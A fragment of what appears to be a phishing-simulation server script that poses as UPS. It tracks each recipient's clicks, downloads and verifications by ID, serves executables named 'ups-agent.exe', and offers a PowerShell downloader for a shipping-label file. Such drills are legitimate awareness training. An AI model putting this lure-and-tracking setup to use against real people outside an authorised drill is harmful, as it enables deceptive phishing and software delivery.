    if (uid) headers['set-cookie'] = 'drill_uid=' + encodeURIComponent(uid) + '; Path=/; Max-Age=86400; SameSite=Lax';
    return new Response(LABEL, { headers: headers });
  }

  if (path === '/download/fleetdeck.exe' || path === '/download/ups-agent.exe') {
    if (uid) await log(env, 'download', uid, request, url.href);
    return Response.redirect(await resolveFleetUrl(), 302);
  }

  if (path === '/verified') {
    if (uid) await log(env, 'verify', uid, request, url.href);
    return new Response(donePage(uid), { headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' } });
  }

  if (path === '/u' || path === '/unsubscribe') {
    if (uid) await log(env, 'unsubscribe', uid, request, url.href);
    return new Response(subPage(uid), { headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' } });
  }

  if (path === '/count') {
    var rows = await env.DB.prepare("SELECT event, COUNT(*) AS n, COUNT(DISTINCT uid) AS u FROM events GROUP BY event").all();
    var map = {};
    for (var i = 0; i < rows.results.length; i += 1) { map[rows.results[i].event] = rows.results[i].n; }
    return Response.json({ count: map.download || 0, downloads: map.download || 0, clicks: map.click || 0, views: map.view || 0, opens: map.open || 0, verifies: map.verify || 0, unsubscribes: map.unsubscribe || 0, generated: new Date().toISOString() });
  }

  if (path === '/checksums.txt') {
    return new Response(SHA + '  UPS-Shipping-Label.html\n', { headers: { 'content-type': 'text/plain; charset=utf-8' } });
  }

  if (path === '/get-payload.ps1') {
    var script = [
      '# UPS simulation payload downloader (Windows).',
      '# Downloads the file, verifies its SHA-256 and saves it. It never runs it.',
      '[CmdletBinding()]',
      'param([string]$Destination = "")',
      '$ErrorActionPreference = "Stop"',
      '$base = "' + url.origin + '"',
      '$sha = "' + SHA + '"',
      'if ([string]::IsNullOrWhiteSpace($Destination)) { $Destination = Join-Path (Get-Location) "UPS-Shipping-Label.html" }',
      'Invoke-WebRequest -Uri ($base + "/download/label.html") -OutFile $Destination -UseBasicParsing',
      '$hash = (Get-FileHash -LiteralPath $Destination -Algorithm SHA256).Hash.ToLowerInvariant()',
      'if ($hash -ne $sha) { Remove-Item -LiteralPath $Destination -Force -ErrorAction SilentlyContinue; throw ("Checksum mismatch. Expected " + $sha + ", got " + $hash) }',
      'Write-Host ("Saved    : " + $Destination)',
      'Write-Host ("SHA-256 : " + $hash + "   (verified)")'
    ].join('\n');
    return new Response(script, { headers: { 'content-type': 'text/plain; charset=utf-8' } });
  }

  if (path === '/stats') {
    if (key !== env.STATS_KEY) return new Response('forbidden', { status: 403 });
    var summary = await env.DB.prepare('SELECT event, COUNT(*) AS n, COUNT(DISTINCT uid) AS u FROM events GROUP BY event').all();
    var rows2 = await env.DB.prepare('SELECT event, uid, ts, ua FROM events ORDER BY id DESC LIMIT 500').all();
    return Response.json({ summary: summary.results, events: rows2.results, generated: new Date().toISOString() });
  }

  return new Response('not found', { status: 404 });
}
